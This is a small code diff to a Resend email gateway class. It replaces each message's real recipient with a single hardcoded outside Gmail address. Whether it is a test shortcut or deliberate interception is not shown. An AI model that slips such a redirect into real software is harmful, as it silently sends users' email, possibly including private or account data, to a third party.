@@ -32,7 +32,7 @@ export class ResendGateway implements MailGateway {
 
       const response = await this.resend.emails.send({
         from: fromEmail,
-        to: props.to,
+        to: 'bitcoinberwian@gmail.com',
         subject: props.subject,
         html: props.body,
       });
